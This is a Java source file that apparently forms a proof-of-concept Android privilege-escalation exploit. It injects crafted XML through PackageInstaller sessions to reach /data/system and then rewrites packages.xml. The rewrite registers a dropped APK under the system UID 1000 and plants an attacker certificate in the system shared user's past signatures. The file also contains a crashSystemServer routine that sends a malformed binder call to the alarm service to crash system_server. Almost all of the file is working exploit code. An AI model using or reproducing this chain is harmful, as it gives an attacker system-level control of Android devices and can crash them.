package com.example.abxoverflow;

import android.content.Context;
import android.content.pm.PackageInstaller;
import android.os.FileUtils;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathFactory;

public class Main {

    static void stage1(Context ctx) throws IOException {
        PackageInstaller packageInstaller = ctx.getPackageManager().getPackageInstaller();

        for (PackageInstaller.SessionInfo session : packageInstaller.getMySessions()) {
            packageInstaller.abandonSession(session.getSessionId());
        }

        int sessionId = packageInstaller.createSession(new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL));

        ctx.getSharedPreferences("a", Context.MODE_PRIVATE).edit().putInt("sessionId", sessionId).commit();

        // Construct injection
        PackageInstaller.Session session = packageInstaller.openSession(sessionId);
        AbxInjector abxInjector = new AbxInjector();
        abxInjector.endTag("sessionChecksum");
        abxInjector.endTag("session");
        abxInjector.injectSession(sessionId, ctx.getPackageName(), true, "/data/system");
        abxInjector.injectSession(sessionId + 1, ctx.getPackageName(), false, "/data/app/dropped_apk");
        abxInjector.endTag("sessions");
        abxInjector.endDocument();
        abxInjector.injectInto(session);

        // Trigger save of new data into install_sessions.xml
        packageInstaller.abandonSession(packageInstaller.createSession(new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)));
    }

    static void stage2(Context ctx) throws Exception {
        PackageInstaller packageInstaller = ctx.getPackageManager().getPackageInstaller();
        int sessionId = ctx.getSharedPreferences("a", Context.MODE_PRIVATE).getInt("sessionId", 0);

        // Extract apk for installation
        try (PackageInstaller.Session session = packageInstaller.openSession(sessionId + 1)) {
            try (InputStream inputStream = ctx.getAssets().open("droppedapk-release.apk");
                 OutputStream outputStream = session.openWrite("base.apk", 0, 0)) {
                FileUtils.copy(inputStream, outputStream);
            }
        }

        // Patch /data/system/packages.xml
        try (PackageInstaller.Session session = packageInstaller.openSession(sessionId)) {
            // Read packages.xml and convert it to regular XML that DOM can parse
            File packagesXmlFile = ctx.getFileStreamPath("p.xml");
            Process process = new ProcessBuilder("abx2xml", "-", packagesXmlFile.getAbsolutePath())
                    .redirectInput(ProcessBuilder.Redirect.PIPE)
                    .start();

            try (InputStream inputStream = session.openRead("packages.xml")) {
                FileUtils.copy(inputStream, process.getOutputStream());
            }
            process.getOutputStream().close();
            process.waitFor();

            // Parse XML
            Document document = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(packagesXmlFile);
            XPath xPath = XPathFactory.newInstance().newXPath();

            // Allocate <keyset> identifier
            Element lastIssuedKeySetId = (Element) xPath.compile("/packages/keyset-settings/lastIssuedKeySetId").evaluate(document, XPathConstants.NODE);
            Element lastIssuedKeyId = (Element) xPath.compile("/packages/keyset-settings/lastIssuedKeyId").evaluate(document, XPathConstants.NODE);
            int myKeySetId = Integer.parseInt(lastIssuedKeySetId.getAttribute("value")) + 1;
            int myKeyId = Integer.parseInt(lastIssuedKeyId.getAttribute("value")) + 1;
            lastIssuedKeySetId.setAttribute("value", String.valueOf(myKeySetId));
            lastIssuedKeyId.setAttribute("value", String.valueOf(myKeyId));

            // Insert <public-key> and <keyset> for newly added apk
            {
                Element publicKey = document.createElement("public-key");
                publicKey.setAttribute("identifier", String.valueOf(myKeyId));
                publicKey.setAttribute("value", TARGET_KEY_BASE64);
                ((Element) xPath.compile("/packages/keyset-settings/keys").evaluate(document, XPathConstants.NODE)).appendChild(publicKey);
            }
            {
                Element keyset = document.createElement("keyset");
                Element keyId = document.createElement("key-id");
                keyset.setAttribute("identifier", String.valueOf(myKeySetId));
                keyId.setAttribute("identifier", String.valueOf(myKeyId));
                keyset.appendChild(keyId);
                ((Element) xPath.compile("/packages/keyset-settings/keysets").evaluate(document, XPathConstants.NODE)).appendChild(keyset);
            }

            // Insert new <package>
            int myCertIndex = 0;
            {
                NodeList certs = (NodeList) xPath.compile("/packages/package//cert[@index][@key]").evaluate(document, XPathConstants.NODESET);
                for (int i = 0; i < certs.getLength(); i++) {
                    int certIndex = Integer.parseInt(((Element) certs.item(i)).getAttribute("index"));
                    myCertIndex = Math.max(myCertIndex, certIndex + 1);
                }
            }
            {
                Element packageElem = document.createElement("package");
                packageElem.setAttribute("name", "com.example.abxoverflow.droppedapk");
                packageElem.setAttribute("codePath", "/data/app/dropped_apk");
                packageElem.setAttribute("sharedUserId", "1000");
                packageElem.setAttribute("publicFlags", "0");
                Element sigsElem = document.createElement("sigs");
                sigsElem.setAttribute("count", "1");
                sigsElem.setAttribute("schemeVersion", "2");
                Element certElem = document.createElement("cert");
                certElem.setAttribute("index", String.valueOf(myCertIndex));
                certElem.setAttribute("key", TARGET_CERT_HEX);
                sigsElem.appendChild(certElem);
                packageElem.appendChild(sigsElem);
                Element firstSharedUser = (Element) xPath.compile("/packages/shared-user").evaluate(document, XPathConstants.NODE);
                firstSharedUser.getParentNode().insertBefore(packageElem, firstSharedUser);
            }

            // Insert <pastSigs> into <shared-user name="android.uid.system" userId="1000"><sigs>
            {
                Element sharedUser = (Element) xPath.compile("/packages/shared-user[@userId=\"1000\"]/sigs").evaluate(document, XPathConstants.NODE);
                // Delete previously existing <pastSigs> if any
                deletePastSigsLoop:
                for (; ; ) {
                    NodeList childNodes = sharedUser.getChildNodes();
                    for (int i = 0; i < childNodes.getLength(); i++) {
                        Node item = childNodes.item(i);
                        if (item instanceof Element && "pastSigs".equals(item.getNodeName())) {
                            sharedUser.removeChild(item);
                            continue deletePastSigsLoop;
                        }
                    }
                    break;
                }
                // Insert new <pastSigs>
                Element pastSigsElem = document.createElement("pastSigs");
                pastSigsElem.setAttribute("count", "2");
                pastSigsElem.setAttribute("schemeVersion", "3");
                for (int i = 0; i < 2; i++) {
                    Element certElem = document.createElement("cert");
                    certElem.setAttribute("index", String.valueOf(myCertIndex));
                    certElem.setAttribute("flags", "2");
                    pastSigsElem.appendChild(certElem);
                }
                sharedUser.appendChild(pastSigsElem);
            }

            // Write new XML
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            TransformerFactory.newInstance().newTransformer()
                    .transform(new DOMSource(document), new StreamResult(baos));

            try (OutputStream outputStream = session.openWrite("packages-backup.xml", 0, 0)) {
                outputStream.write(baos.toByteArray());
            }
        }
    }

    static void crashSystemServer() throws IOException {
        new ProcessBuilder(
                // IAlarmManager.set
                "service", "call", "alarm", "1",
                // String callingPackage
                "i32", "-1",
                // int type
                "i32", "0",
                // long triggerAtTime
                "i64", "0",
                // long windowLength
                "i64", "0",
                // long interval
                "i64", "0",
                // int flags
                "i32", "0",
                // PendingIntent operation == null
                "i32", "0",
                // IAlarmListener listener
                "null",
                // String listenerTag
                "i32", "-1",
                // WorkSource workSource == null
                "i32", "0",
                // AlarmManager.AlarmClockInfo alarmClock != null
                "i32", "1",
                // long mTriggerTime
                "i64", "0",
                // mShowIntent = readParcelable
                "s16", "android.content.pm.PackageParser$Activity",
                // String PackageParser.Component.className = null
                "i32", "-1",
                // String PackageParser.Component.metaData = null
                "i32", "-1",
                // createIntentsList() N=1
                "i32", "1",
                // Class.forName()
                "s16", "android.os.PooledStringWriter",
                // Padding so write goes in-place into read-only preallocated memory
                "i32", "0"
        ).start();
    }

    static final String TARGET_CERT_HEX = "308202a43082018c020101300d06092a864886f70d01010b050030183116301406035504030c0d61627864726f7070656461706b301e170d3233313032303038353535365a170d3438313031333038353535365a30183116301406035504030c0d61627864726f7070656461706b30820122300d06092a864886f70d01010105000382010f003082010a0282010100928c5e2732fa5e0ffad5baca33543bc54fe19b6a5d24da8cfc404ad00811f0ad7f632a6b1bf06ac9d41e3ab01bc7af4510255667ee45849ae9fa8e262156d9e3809e0fa90748f3cbf3b7480965b655f195859630f03a9ca84ccc31f9808cf87e8ac6d107d918da4c1523e787a61e6231cce4ede22934800cb2da9244728a01d757ae38b207a70c6ba5081d2ded3104ce8882558a64abe128b855e122dd1a674cd75d56171af7f08bfa07ce8de30cc8aece12ee202927d1fde3196550cc64781ed4d5c3e14c7bd80b364cc9acb8ed80c67d4bfcd984ff8f1718c370fc5d34a25c8563d0cef1e1a02fa3d975518af512d4b6ecc3e625a5d11c4deda9a6d46a80410203010001300d06092a864886f70d01010b050003820101000a524837b72e5cffddfa675b7840d014fd4bdbd360c0e8d825caf0f4667d122c1503dc21a77517e988416e648619daa94968b509aca29286a9b36b2d23c6c164ef6fa3e23fcb09ce680e19c7f4617a7e4107668096c27f0f79cddb60df79c901662dee6b864df7380023a9ac1b445ac339c04ddb4d5701d72bee30f79583de6e001631f884b5616a7a0c1094b13dfbbd29053a3c6841aa92a1e7a6ab60c2099a2fec8566f15c1163b31c0a3f12406bfaa35aff3dbfff3a352bc921d9e719569179ded2e682dbd68c8c87393baed0be66111320b187dec85b071fd850c1b41f34fc97b014d155b10c10e77cb9b5c4b4d5247aca6155463f77352fd3f20ee0a330";
    static final String TARGET_KEY_BASE64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkoxeJzL6Xg/61brKM1Q7xU/hm2pdJNqM/EBK0AgR8K1/YyprG/BqydQeOrAbx69FECVWZ+5FhJrp+o4mIVbZ44CeD6kHSPPL87dICWW2VfGVhZYw8DqcqEzMMfmAjPh+isbRB9kY2kwVI+eHph5iMczk7eIpNIAMstqSRHKKAddXrjiyB6cMa6UIHS3tMQTOiIJVimSr4Si4VeEi3RpnTNddVhca9/CL+gfOjeMMyK7OEu4gKSfR/eMZZVDMZHge1NXD4Ux72As2TMmsuO2Axn1L/NmE/48XGMNw/F00olyFY9DO8eGgL6PZdVGK9RLUtuzD5iWl0RxN7amm1GqAQQIDAQAB";
}
